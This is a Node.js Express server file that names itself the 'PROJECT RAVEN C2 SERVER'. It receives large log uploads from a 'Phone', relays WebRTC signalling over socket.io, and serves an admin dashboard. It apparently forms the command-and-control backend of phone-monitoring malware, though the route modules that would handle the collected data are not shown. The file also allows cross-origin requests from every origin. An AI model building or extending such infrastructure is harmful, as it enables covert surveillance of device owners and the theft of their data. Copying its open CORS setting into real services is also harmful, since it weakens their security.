const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const cors = require('cors');
const path = require('path');
const fs = require('fs');
require('dotenv').config();

// --- CONFIGURATION ---
const PORT = process.env.PORT || 3000;
const UPLOAD_DIR = path.join(__dirname, 'uploads');

// Ensure upload directory exists
if (!fs.existsSync(UPLOAD_DIR)) {
    fs.mkdirSync(UPLOAD_DIR);
}

// --- INITIALIZATION ---
const app = express();
const server = http.createServer(app);
const io = new Server(server, {
    cors: {
        origin: "*", // RUTHLESS: Allow all origins for now (Fix in prod)
        methods: ["GET", "POST"]
    }
});

// --- MIDDLEWARE ---
app.use(cors());
app.use(express.json({ limit: '50mb' })); // Allow large JSON payloads (Logs)
app.use(express.urlencoded({ extended: true }));
app.use(express.static('public')); // Serve the Dashboard (Web App)

// --- ROUTES ---
// 1. API Routes (The Phone talks to these)
// Pass 'io' to the API routes so they can bridge HTTP -> WebSocket
const apiRoutes = require('./routes/api')(io);
app.use('/api/v1', apiRoutes);

// 2. Admin Routes (You talk to these)
const adminRoutes = require('./routes/admin');
app.use('/admin-api', adminRoutes);

// --- WEBSOCKETS (WebRTC Signaling) ---
require('./sockets/signaling')(io);

// --- START ---
server.listen(PORT, () => {
    console.log(`
    ===========================================
    PROJECT RAVEN C2 SERVER
    Status: ONLINE
    Port: ${PORT}
    Dashboard: http://localhost:${PORT}/admin
    ===========================================
    `);
});
